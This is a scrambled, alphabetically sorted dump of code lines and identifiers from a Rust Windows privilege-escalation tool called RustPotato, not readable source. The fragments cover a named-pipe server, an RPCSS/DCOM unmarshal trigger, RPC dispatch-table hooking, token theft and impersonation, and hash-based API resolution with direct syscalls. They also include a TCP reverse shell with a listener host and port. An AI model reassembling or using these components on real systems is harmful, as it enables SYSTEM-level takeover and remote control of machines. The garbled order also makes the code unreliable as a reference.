Some(SecurityImpersonationLevel)
Some(Sid)
Some(TokenElevationType)
Some(TokenType)
Special thanks to:
Standard
Start Named Pipe Server and Trigger RPCSS
String
String::from_utf8_lossy(
StringBinding
Sync
TCP-based Reverse Shell
Terminate Pipe Server
The above copyright notice and this permission notice shall be included in all
The named pipe server plays a central role in impersonation and privilege escalation:
This project is for 
TokenIntegrityLevel
TokenUsername
Trigger RPCSS
UNICODE_STRING
UnicodeString
Unmarshal COM Object
UnmarshalDCOM
Usage:
UseProtseq
UseProtseqFunction
Vec<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>
Vec<u16>
Vec<u8>
WS32_PTR }
Win32Pipes.<process_id>.<pipe_id>
WindowsIdentity
[0xAA]) // Send a termination signal byte
[[package]]
[allow(dead_code)]
[allow(non_camel_case_types)]
[allow(non_snake_case)]
[allow(unsafe_op_in_unsafe_fn)]
[allow(unused)]
[cfg(test)]
[dependencies]
[derive(Clone)]
[derive(Default)]
[features]
[implement()]
[in]
[isize
[macro_export]
[out]
[package]
[profile.release]
[repr(C)]
[repr(u16)]
[repr(u32)]
[test]
[u8]) -> Option<
[u8]) -> Option<Self> {
[u8]) -> Option<Sid> {
[u8]) -> Vec<usize> {
[u8]) -> [isize
[u8]) -> u32 {
] INITIALIZE CONTEXT - END
] INITIALIZE CONTEXT - START
] PIPE SERVER - END
] PIPE SERVER - START
] RPC HOOK - END
] RPC HOOK - START
_IMAGE_RUNTIME_FUNCTION_ENTRY
_ppdsa_new_security
addr
addr = unsafe { dll_base.offset(function_address as isize) } as 
addr_info_ptr
address
address_of_functions.offset(ordinal as isize) }
address_of_name_ordinals.offset(j as isize) }
address_of_names.offset(j as isize) as isize) }
alertable
any misuse is entirely your responsibility.
apc_context
apc_routine
args[1]
b in identifier_authority {
base_addr
base_address
bash
bind_ctx
buf).ok()
buffer
buffer[..bytes_read as usize]))
byte) in pattern.iter().enumerate() {
byte_offset
bytes[10..16]
bytes[2..8]
bytes[8..10]
bytes[offset..offset 
callback
client_id
cmd.exe
cmd_line
cmdline
codegen-units = 1
com_stream)
combase.dll
command shell
command.unwrap_or_else(
completion_mode
const 
const Advapi32 = core::ptr::null()
const ImageDosHeader
const ImageExportDirectory
const ImageNtHeaders
const Kernel32 = core::ptr::null()
const MidlServerInfo)
const NtDll = core::ptr::null()
const RpcDispatchTable)
const RpcServerInterface
const SockAddr
const SockAddrIn)
const SystemHandleInformationEx
const TokenGroups) }
const TokenMandatoryLabel)
const TokenUser) }
const Winsock = core::ptr::null()
const _ as 
const c_void
const char) -> usize {
const core::ffi::c_ulong
const core::ffi::c_ushort
const i8
const i8) -> u32
const u16
const u16)
const u16) -> usize {
const u16) {
const u32
const u8
const u8 }
const u8) != 0 {
const u8) as u32
copies or substantial portions of the Software.
create_disposition
create_options
data.unwrap())
debug = false
debug-assertions = false
default = []
default_timeout
dependencies = [
descriptor_string
desired_access
dispatch_entry = self.use_protseq_delegate
dispatch_entry = self.use_protseq_function_ptr
dispatch_entry as usize
domain[..domain_size as usize])
dos_header).e_lfanew as isize) as 
dos_header).e_lfanew as isize) } as 
dos_header).e_magic != IMAGE_DOS_SIGNATURE {
dwBytes
dwFlags
educational and research purposes only
elevation
endpoints {
ent).dll_base as 
ent).in_memory_order_links.flink }
entry) in self.dispatch_table.iter().enumerate() {
event
exit_status
export_directory).address_of_functions as isize) as 
export_directory).address_of_functions as isize) }
export_directory).address_of_name_ordinals as isize) as 
export_directory).address_of_name_ordinals as isize) }
export_directory).address_of_names as isize) as 
export_directory).address_of_names as isize) }
export_directory).name as isize) } as 
export_directory).number_of_functions
export_directory).number_of_functions } {
export_directory).number_of_names == 0 } {
extern crate alloc
false
file_handle
first_match) = matches.first() {
flags
fn ensure_initialized() {
fn main() {
fn put_token(tokens: 
fn read_string(reader: 
fn to_hex_char(digit: u16) -> u16 {
function_hash
get_token
global_asm!(
guid_buf).ok()
hHeap
h_read_pipe = read_pipe_handle
h_write_pipe = write_pipe_handle
handle
handle_attributes
handle_info).number_of_handles as usize {
hash
htoken
impl Advapi32 {
impl ClientId {
impl DualStringArray {
impl GUID {
impl IoStatusBlock {
impl IsNull for u16 {
impl Kernel32 {
impl LargeInteger {
impl NewOrcbRPC {
impl NtClose {
impl NtCreateNamedPipeFile {
impl NtDll {
impl NtDuplicateObject {
impl NtDuplicateToken {
impl NtOpenFile {
impl NtOpenProcess {
impl NtOpenProcessToken {
impl NtProtectVirtualMemory {
impl NtQueryInformationProcess {
impl NtQueryInformationToken {
impl NtQueryObject {
impl NtQuerySystemInformation {
impl NtReadFile {
impl NtSetInformationObject {
impl NtTerminateProcess {
impl NtWaitForSingleObject {
impl NtWriteFile {
impl ObjRef {
impl ObjectAttributes {
impl ProcessInformation {
impl ProcessToken {
impl RawHandle {
impl RustPotatoContext {
impl RustPotatoUnmarshalTrigger {
impl SecurityBinding {
impl Sid {
impl Standard {
impl StartupInfoW {
impl StringBinding {
impl Sunday {
impl TokenUsername {
impl TryFrom<u16> for TowerProtocol {
impl UnicodeString {
impl UnmarshalDCOM {
impl WindowsIdentity {
impl Winsock {
impl fmt::Display for ProcessToken {
impl fmt::Display for TokenUsername {
inbound_quota
incremental = false
init_context
io_status_block
is_hook
is_start
is_start = false
isyscall:
ldr).in_memory_order_module_list }
ldr).in_memory_order_module_list.flink }
length
level
libc_println
list_system_handles
listener host
listener port
lp_pipe_attributes).b_inherit_handle } {
lp_pipe_attributes).lp_security_descriptor }
lto = true
macro_rules! _print {
macro_rules! define_nt_syscall {
macro_rules! resolve_functions {
macro_rules! resolve_native_functions {
macro_rules! run_syscall {
mask
maximum_instances
mod context
mod def
mod objref
mod orcb
mod parse_args
mod rev
mod tests {
mod token
mod trigger
mod utils
mod win32
module_base
module_hash
module_list).base_dll_name.buffer
module_list).base_dll_name.length as usize
module_list).dll_base as _
module_list).dll_base.is_null() {
module_list).in_load_order_links.flink as 
module_list).size_of_image as usize
moniker
mut 
mut $syscall.address) as u16
mut (self.dispatch_table_ptr as 
mut AddrInfo = null_mut()
mut AddrInfo)
mut ImageDosHeader
mut ImageExportDirectory
mut ImageNtHeaders
mut ImageNtHeaders {
mut ImageRuntimeFunctionEntry
mut LoaderDataTableEntry
mut PEB
mut PEB {
mut PebLoaderData
mut PebLoaderData }
mut R) -> Option<Self> {
mut RpcMessage)>
mut SECURITY_DESCRIPTOR = core::ptr::null_mut()
mut TEB
mut TEB {
mut W) -> Option<()> {
mut WsaData) -> i32
mut _ as 
mut _)
mut buf).ok()
mut bytes)
mut c_void
mut c_void = core::ptr::null_mut()
mut c_void = null_mut()
mut c_void = std::ptr::null_mut()
mut c_void {
mut c_void)
mut c_void) -> Option<IntegrityLevel> {
mut c_void) -> Option<Sid> {
mut c_void) -> Option<TokenElevationType> {
mut c_void) -> Option<TokenType> {
mut c_void) -> bool {
mut c_void) -> i32 {
mut c_void> = None
mut c_void> {
mut c_void>()
mut c_void>() 
mut core::ffi::c_void
mut core::ffi::c_void> {
mut cursor)
mut fmt::Formatter) -> fmt::Result {
mut fmt::Formatter<'_>) -> fmt::Result {
mut guid_buf).ok()
mut handle_info as 
mut impl Read) -> Option<String> {
mut module_size))
mut nonblocking)
mut process_basic_info as 
mut read_fds as 
mut res)
mut security_descriptor as 
mut self) -> Option<()> {
mut sid) }
mut sid_type as 
mut sqos as 
mut std::ffi::c_void =
mut timeout as 
mut tokens[i]
mut u16
mut u32) -> i32
mut u8
mut u8 {
mut u8 }
mut u8) -> 
mut u8) -> i32 {
mut u8).offset(-(core::mem::size_of::<ListEntry>() as isize)) }
mut unsafe { (
mut usize>) -> 
mut winapi::ctypes::c_void
mut winapi::ctypes::c_void = -1isize as 
mut winapi::ctypes::c_void = CreateNamedPipeW(
mut winapi::ctypes::c_void {
mut winapi::ctypes::c_void)
mut winapi::ctypes::c_void) -> bool {
mut winapi::ctypes::c_void) {
mut ws2_win32_handle as 
mut wsa_data)
name[..name_size as usize])
named_pipe_type
new_protect
nt_headers).optional_header.data_directory[0].virtual_address }
nt_headers).optional_header.data_directory[3].virtual_address }
nt_headers).signature != IMAGE_NT_SIGNATURE as _ {
ntdll.dll
null
null_mut()
number
object_attributes
object_information
object_information_class
object_information_length
objref_bytes.unwrap())
offset) in self.fmt_string_offset_table.iter().enumerate() {
old_protect
open_options
options
outbound_quota
p_img_nt_headers).optional_header.data_directory[0]
p_iunknown
p_iunknown).ok() }
part1.to_le_bytes())
part2.to_le_bytes())
part3.to_le_bytes())
part4.to_be_bytes()[..2])
part5.to_be_bytes()[2..8])
pattern
pattern)
peb).loader_data as 
peb_ldr_data_ptr).in_load_order_module_list.flink as 
pipe
pipe_id
powershell
powershell.exe
powershell>
ppdsa_new_bindings
process
process token
process_handle
process_id
process_information
process_information_class
process_information_length
process_token
process_token.sid) {
pub const BAD_HANDLE: 
pub const CREATE_NO_WINDOW: u32 = 0x08000000
pub const CREATE_UNICODE_ENVIRONMENT: u32 = 0x00000400
pub const FILE_APPEND_DATA: c_ulong = 0x00000004
pub const FILE_CREATE: u32 = 0x00000002
pub const FILE_GENERIC_WRITE: u32 = STANDARD_RIGHTS_WRITE
pub const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040
pub const FILE_PIPE_BYTE_STREAM_MODE: u32 = 0x00000000
pub const FILE_PIPE_BYTE_STREAM_TYPE: u32 = 0x00000000
pub const FILE_PIPE_QUEUE_OPERATION: u32 = 0x00000000
pub const FILE_SHARE_READ: c_ulong = 0x00000001
pub const FILE_SHARE_WRITE: c_ulong = 0x00000002
pub const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020
pub const FILE_WRITE_ATTRIBUTES: c_ulong = 0x00000100
pub const FILE_WRITE_DATA: c_ulong = 0x00000002
pub const FILE_WRITE_EA: c_ulong = 0x00000010
pub const FIONBIO: i32 = -2147195266i32
pub const GENERIC_EXECUTE: u32 = 0x20000000
pub const GENERIC_READ: u32 = 0x80000000
pub const GENERIC_WRITE: u32 = 0x40000000
pub const HANDLE_FLAG_INHERIT: u32 = 0x00000001
pub const HANDLE_FLAG_PROTECT_FROM_CLOSE: u32 = 0x00000002
pub const HEAP_ZERO_MEMORY: u32 = 0x00000008
pub const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D
pub const IMAGE_NT_SIGNATURE: u32 = 0x00004550
pub const OBJ_CASE_INSENSITIVE: c_ulong = 0x40
pub const OBJ_INHERIT: c_ulong = 0x00000002
pub const PROCESS_DUP_HANDLE: u32 = 0x0040
pub const PROCESS_QUERY_INFORMATION: u32 = 0x0400
pub const STANDARD_RIGHTS_WRITE: c_ulong = 0x00020000
pub const STARTF_USESTDHANDLES: u32 = 0x00000100
pub const STATUS_BUFFER_TOO_SMALL: i32 = 0xC0000023u32 as i32
pub const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32
pub const SYNCHRONIZE: c_ulong = 0x00100000
pub const TOKEN_ADJUST_DEFAULT: u32 = 0x0080
pub const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020
pub const TOKEN_ADJUST_SESSIONID: u32 = 0x0100
pub const TOKEN_ASSIGN_PRIMARY: u32 = 0x0001
pub const TOKEN_DUPLICATE: u32 = 0x0002
pub const TOKEN_ELEVATION: u32 = TOKEN_QUERY
pub const TOKEN_IMPERSONATE: u32 = 0x0004
pub const TOKEN_QUERY: u32 = 0x0008
pub const fn nt_current_process() -> 
pub enum IntegrityLevel {
pub enum ObjRefType {
pub enum ObjectInformationClass {
pub enum SecurityImpersonationLevel {
pub enum TokenElevationType {
pub enum TokenType {
pub enum TowerProtocol {
pub fn NT_SUCCESS(status: i32) -> bool {
pub fn create_process_with_token_w_piped(
pub fn create_security_descriptor(
pub fn create_socket() -> SOCKET {
pub fn dbj2_hash(buffer: 
pub fn find_peb() -> 
pub fn get_cstr_len(pointer: 
pub fn handle_at(handle_info_ptr: 
pub fn init_advapi32_funcs() {
pub fn init_kernel32_funcs() {
pub fn init_ntdll_funcs() {
pub fn init_winsock() -> i32 {
pub fn init_winsock_funcs() {
pub fn k32() -> 
pub fn list_system_handles() -> Vec<SystemHandleTableEntryInfoEx> {
pub fn nt_current_teb() -> 
pub fn nt_get_last_error() -> u32 {
pub fn nt_process_heap() -> 
pub fn ntdll() -> 
pub fn parse_args() {
pub fn resolve_hostname(hostname: 
pub fn rs(h: 
pub fn run(c: 
pub fn string_length_w(string: 
pub fn winsock() -> 
pub mod advapi32
pub mod def
pub mod k32
pub mod ldr
pub mod macros
pub mod ntdll
pub mod ssn
pub mod utils
pub mod winsock
pub static GLOBAL_CONTEXT: OnceLock<Arc<RustPotatoContext>> = OnceLock::new()
pub struct AddrInfo {
pub struct Advapi32 {
pub struct ClientId {
pub struct DualStringArray {
pub struct FD_SET {
pub struct GUID {
pub struct ImageDataDirectory {
pub struct ImageDosHeader {
pub struct ImageExportDirectory {
pub struct ImageFileHeader {
pub struct ImageNtHeaders {
pub struct ImageOptionalHeader64 {
pub struct ImageRuntimeFunctionEntry {
pub struct InAddr {
pub struct IoStatusBlock {
pub struct Kernel32 {
pub struct LargeInteger {
pub struct ListEntry {
pub struct LoaderDataTableEntry {
pub struct MidlServerInfo {
pub struct NewOrcbRPC
pub struct NtDll {
pub struct NtTib {
pub struct ObjRef {
pub struct ObjectAttributes {
pub struct ObjectHandleAttributeInformation {
pub struct PEB {
pub struct PebLoaderData {
pub struct ProcessBasicInformation {
pub struct ProcessInformation {
pub struct ProcessToken {
pub struct RawHandle(
pub struct RpcDispatchTable {
pub struct RpcMessage {
pub struct RpcProtseqEndpoint {
pub struct RpcServerInterface {
pub struct RpcSyntaxIdentifier {
pub struct RpcVersion {
pub struct RtlUserProcessParameters {
pub struct RustPotatoContext {
pub struct RustPotatoUnmarshalTrigger {
pub struct SampleCOMObject
pub struct SectionPointer {
pub struct SecurityAttributes {
pub struct SecurityBinding {
pub struct SecurityQualityOfService {
pub struct Sid {
pub struct SidAndAttributes {
pub struct SockAddr {
pub struct SockAddrIn {
pub struct Standard {
pub struct StartupInfoW {
pub struct StringBinding {
pub struct Sunday
pub struct SystemHandleInformationEx {
pub struct SystemHandleTableEntryInfoEx {
pub struct TEB {
pub struct TIMEVAL {
pub struct TokenGroups {
pub struct TokenMandatoryLabel {
pub struct TokenUser {
pub struct TokenUsername {
pub struct UnicodeString {
pub struct UnmarshalDCOM
pub struct WindowsIdentity {
pub struct Winsock {
pub struct WsaData {
pub trait NtSyscall {
pub type PimageRuntimeFunctionEntry = 
pub type RtlAllocateHeap =
pub type SOCKET = usize
pub union HashLinksOrSectionPointer {
pub union IMAGE_RUNTIME_FUNCTION_ENTRY_u {
pub union IO_STATUS_BLOCK_u {
pub union TimeDateStampOrLoadedImports {
pub unsafe fn advapi32() -> 
pub unsafe fn get_nt_headers(base_addr: 
pub unsafe fn ldr_function(module_base: 
pub unsafe fn nt_create_named_pipe_file(
pub unsafe fn nt_set_handle_information(
read_mode
region_size
return_length
rid_ptr
rpc_server_interface_ptr
rtf.offset(i as isize)).begin_address }
s address in 
security_attributes as 
security_binding_bytes).ok()
select
self == 0
self) -> 
self) -> Option<RawHandle> {
self) -> Option<TokenUsername> {
self) -> Option<Vec<u8>> {
self) -> Result<
self) -> Result<[u8
self) -> bool
self) -> bool {
self) -> u16
self) -> u16 {
self) -> usize
self) -> usize {
self) -> winapi::um::winnt::HANDLE {
self) {
self.guid.to_le_bytes().ok()
self.ipid.to_le_bytes().ok()
self.orcb_rpc_guid.to_le_bytes().unwrap())
self.principal_name {
self.server_pipe) {
self.system_identity {
set_token
share_access
size
size_ref = (
skip:
sockaddr_in as 
source_handle
source_process_handle
static INIT_ADVAPI32: AtomicBool = AtomicBool::new(false)
static INIT_K32: AtomicBool = AtomicBool::new(false)
static INIT_NTDLL: AtomicBool = AtomicBool::new(false)
static INIT_WS32: AtomicBool = AtomicBool::new(false)
static mut ADVAPI32_PTR: 
static mut K32_PTR: 
static mut NTDLL_PTR: 
static mut WS32_PTR: 
std::alloc
str) -> u32 {
str> = self.value.split('-').collect()
stream
string2).is_null() {
string_binding_bytes).ok()
strip = true
system_information
system_information_class
system_information_length
target_handle
target_pid
target_process_handle
target_process_pid
target_process_token
text
timeout
token
token_handle
token_information
token_information_class
token_information_length
tokens
trait IsNull {
trigger
true
type WSAStartupFunc =
unsafe fn ensure_initialized() {
unsafe fn ensure_initialized_advapi32() {
unsafe impl Send for Advapi32 {}
unsafe impl Send for Kernel32 {}
unsafe impl Send for RawHandle {}
unsafe impl Send for RustPotatoContext {}
unsafe impl Send for TEB {}
unsafe impl Sync for Advapi32 {}
unsafe impl Sync for Kernel32 {}
unsafe impl Sync for RawHandle {}
unsafe impl Sync for RustPotatoContext {}
unsafe impl Sync for TEB {}
unwrap
use alloc::vec::Vec
use base64::Engine
use base64::engine::general_purpose::STANDARD
use context::RustPotatoContext
use core::arch::asm
use core::arch::global_asm
use core::ffi::c_ulong
use core::ffi::c_void
use core::fmt
use core::ptr
use core::ptr::null_mut
use core::{
use crate::_print
use crate::context::GLOBAL_CONTEXT
use crate::def::SampleCOMObject
use crate::orcb::NewOrcbRPC
use crate::rev::rs
use crate::token::{
use crate::trigger::RustPotatoUnmarshalTrigger
use crate::win32::def::HEAP_ZERO_MEMORY
use crate::win32::ldr::ldr_module
use crate::win32::ldr::nt_process_heap
use crate::win32::ntdll::ntdll
use crate::win32::utils::string_length_w
use crate::win32::{
use crate::{
use libc_print::libc_println
use parse_args::parse_args
use std::fs::OpenOptions
use std::io::Error
use std::io::Write as _
use std::ptr
use std::ptr::null_mut
use std::thread::JoinHandle
use std::{
use super::def::nt_current_teb
use super::{
use winapi::ctypes::c_void
use winapi::shared::ntdef::HANDLE
use winapi::shared::sddl::{
use winapi::um::memoryapi::ReadProcessMemory
use winapi::um::winbase::LookupAccountSidW
use winapi::um::{
use windows::Win32::System::Com::Marshal::CoUnmarshalInterface
use windows::Win32::System::Com::StructuredStorage::CreateStreamOnHGlobal
use windows::Win32::System::Com::{
use windows_core::implement
use_protseq_delegate
usize
verbose
verbose = []
version = 4
where
